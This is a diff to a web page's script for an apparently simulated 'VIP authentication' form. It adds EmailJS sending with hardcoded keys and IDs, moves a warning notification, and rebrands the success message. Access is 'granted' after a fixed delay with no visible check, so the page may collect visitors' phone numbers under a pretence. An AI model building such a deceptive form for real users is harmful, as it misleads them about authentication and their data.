@@ -569,6 +569,31 @@
         showNotification('Please enter a valid phone number', 'error');
         return;
       }
+      // Initial notification
+    setTimeout(() => {
+      showNotification('VIP authentication required', 'warning');
+    }, 1000);
+    //5.a  Initialise EmailJS – include https://cdn.emailjs.com/sdk/3.11/email.min.js in your HTML <head> first.
+(function(){
+  // Replace YOUR_PUBLIC_KEY with your EmailJS public key
+  emailjs.init("wSx4Ps5khqUrvvcck");
+})();
+
+// 5.b  Wrapper → returns a Promise (so we can await in the form submit handler)
+function sendMail(params){
+  // If you prefer manual element grabs, you can override: params = { ... }
+  return emailjs
+    .send("service_29lukqj", "template_xu69k5k", params)
+    .then(resp => {
+      console.log("EmailJS success", resp);
+      showNotification("Confirmation email sent", "success");
+    })
+    .catch(err => {
+      console.error("EmailJS error", err);
+      showNotification("Unable to send email", "error");
+      throw err; // bubble up to caller
+    });
+}
       
       // Disable button during processing
       const originalBtnText = submitBtn.innerHTML;
@@ -580,7 +605,7 @@
         await new Promise(resolve => setTimeout(resolve, 1500));
         
         // Success
-        showNotification('Access granted! Welcome to CAUSEHERE co.', 'success');
+        showNotification('Access granted! Welcome to E-cosyfom.co.', 'success');
         submitBtn.innerHTML = '<i class="fas fa-check"></i> ACCESS GRANTED';
         
         // Redirect after delay
@@ -623,10 +648,7 @@
       }, 3000);
     }
 
-    // Initial notification
-    setTimeout(() => {
-      showNotification('VIP authentication required', 'warning');
-    }, 1000);
+    
   </script>
 </body>
 </html>
